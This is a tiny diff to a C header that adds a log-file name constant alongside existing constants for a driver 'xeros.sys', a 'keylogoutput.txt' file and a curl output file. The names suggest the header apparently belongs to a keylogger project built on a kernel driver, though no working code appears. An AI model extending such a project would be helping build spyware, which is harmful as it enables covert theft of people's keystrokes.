@@ -42,6 +42,7 @@
 #define DRIVER_FILE_NAME		L"xeros.sys"
 #define DRIVER_OUTPUT_FILE_NAME L"keylogoutput.txt"
 #define CURL_OUTPUT_FILE_NAME	L"curloutput.html"
+#define LOG_FILE_NAME			L"Xeroslog.txt"
 
 
 #endif
